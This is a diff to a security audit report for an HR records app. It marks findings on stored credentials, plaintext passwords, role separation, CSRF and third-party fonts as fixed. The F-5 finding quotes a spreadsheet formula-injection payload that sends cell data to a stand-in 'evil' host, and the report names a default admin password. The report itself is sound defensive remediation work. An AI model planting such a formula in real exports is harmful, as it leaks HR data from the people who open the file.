@@ -30,7 +30,7 @@ not tracked).
 - **Exploit:** If `HR_ADMIN_PASSWORD` is unset (fresh deploy, mis-configured Railway service), the API silently accepts `hr`/`admin123`. The default is also published in `HANDOVER.md`, so any reachable deployment is one curl away from full read/write/delete of all HR records.
 - **Fix applied:** Fail closed. With no `HR_ADMIN_PASSWORD_HASH` and a missing/known-default `HR_ADMIN_PASSWORD` (`admin123`, `admin`, `password`, `changeme`, empty), every authenticated request returns **503 "Authentication is not configured"** and an error is logged at startup. **Deployment note: this is a breaking change — local dev and Railway must now set a real password (or hash).**
 
-### F-2 — Credentials persisted in `localStorage` 🟡 MITIGATED (full fix in Phase 2)
+### F-2 — Credentials persisted in `localStorage` ✅ FIXED (Phase 2: httpOnly cookie sessions; no credential ever touches web storage)
 - **File:** `frontend/src/api.js:4-10`
 - **Exploit:** The Basic-auth token (`btoa(user:pass)` — i.e. the plaintext password, reversibly encoded) was stored in `localStorage`, which survives forever, is shared across tabs, and is readable by any JS that ever executes in the origin (XSS, malicious browser extension, shared workstation).
 - **Fix applied:** Moved to `sessionStorage` (cleared on tab close, not shared across tabs). This shrinks the exposure window but a credential in any web storage is still XSS-readable. **The real fix — httpOnly cookie sessions — is the core of Phase 2.**
@@ -42,7 +42,7 @@ not tracked).
 - **Exploit:** Unlimited password guesses against a single well-known username (`hr`). A throwaway script brute-forces a weak password in minutes; nothing is even logged.
 - **Fix applied:** Per-client-IP lockout — 5 failed attempts within 15 minutes returns **429** (with `Retry-After`) for 15 minutes. Failed attempts are logged with username and source IP. In-memory by design (single uvicorn process + SQLite); must move to a shared store if the app is ever scaled out.
 
-### F-4 — Password compared/stored in plaintext, no bcrypt/argon2 ✅ FIXED (bcrypt option; per-user storage is Phase 2)
+### F-4 — Password compared/stored in plaintext, no bcrypt/argon2 ✅ FIXED (Phase 2: per-user bcrypt hashes in the `users` table)
 - **File:** `backend/app/auth.py:7,15`
 - **Exploit:** The admin password lives in plaintext in env config and process memory of every environment (CI, Railway dashboard, shell history via `HANDOVER.md`'s `$env:HR_ADMIN_PASSWORD=...` instructions). Anyone with read access to the environment owns the system.
 - **Fix applied:** New `HR_ADMIN_PASSWORD_HASH` env var (bcrypt, takes precedence over the plaintext var) verified with `bcrypt.checkpw`. Generate with:
@@ -54,7 +54,7 @@ not tracked).
 - **Exploit:** `comment` and `submitted_by` are free text echoed into `.xlsx` cells. openpyxl types a string starting with `=` as a *formula*, so a violation logged with comment `=HYPERLINK("http://evil/?"&A1, "open")` (or worse, a DDE payload) executes when HR opens the exported report — code execution / data exfiltration on the HR workstation.
 - **Fix applied:** All free-text cells are passed through `_xlsx_safe()`, which prefixes a `'` when the value starts with `=`, `+`, `-`, `@`, tab, or CR.
 
-### F-6 — Single shared account: no RBAC, no horizontal/vertical separation, no audit trail ⏳ DEFERRED → Phase 2
+### F-6 — Single shared account: no RBAC, no horizontal/vertical separation, no audit trail ✅ FIXED (Phase 2: 4 roles, scoped queries, per-user identity on every violation)
 - **Files:** `backend/app/auth.py` (one credential), `backend/app/routers/violations.py:127-130` and `employees.py:36-39` (unrestricted DELETE)
 - **Exploit:** Every user is the same super-admin. Anyone with the shared password can delete violations/employees with no record of *who* did it (`submitted_by` is free text — trivially spoofable). Privilege-escalation review is moot until roles exist.
 - **Status:** This is precisely the Phase 2 deliverable (per-user accounts, HR Manager / HR Officer / Department Head / Employee roles, protected routes, audit-friendly identity). Interim: failed logins are now logged; deletes remain admin-gated.
@@ -132,10 +132,10 @@ not tracked).
 - **Risk:** Not injectable (parameterised), but malformed dates silently produced wrong report results — an integrity issue for disciplinary records.
 - **Fix applied:** `date_from`/`date_to` must match `YYYY-MM-DD` or the API returns 400 (applies to list and export).
 
-### F-21 — CSRF — not currently exploitable; becomes critical in Phase 2 ℹ️ TRACKED
+### F-21 — CSRF ✅ FIXED (Phase 2: SameSite=Lax cookies + double-submit token required on every mutation)
 - Auth is an `Authorization` header attached explicitly by JS, never auto-sent by the browser, so cross-site request forgery has no vector today. **When Phase 2 moves to httpOnly cookies, CSRF defenses (SameSite=Lax/Strict + token or double-submit) are mandatory** — flagged here so it cannot be forgotten.
 
-### F-22 — Fonts loaded from Google CDN at runtime ⏳ DEFERRED
+### F-22 — Fonts loaded from Google CDN at runtime ✅ FIXED (Phase 3: self-hosted via @fontsource-variable, bundled by Vite; no third-party requests)
 - **File:** `frontend/src/App.jsx:115`
 - **Risk:** Third-party runtime dependency leaks user IPs to Google, blocks a strict CSP, and breaks offline/intranet use. Recommend self-hosting the two font families (Phase 3, with the rest of the UI work).
 
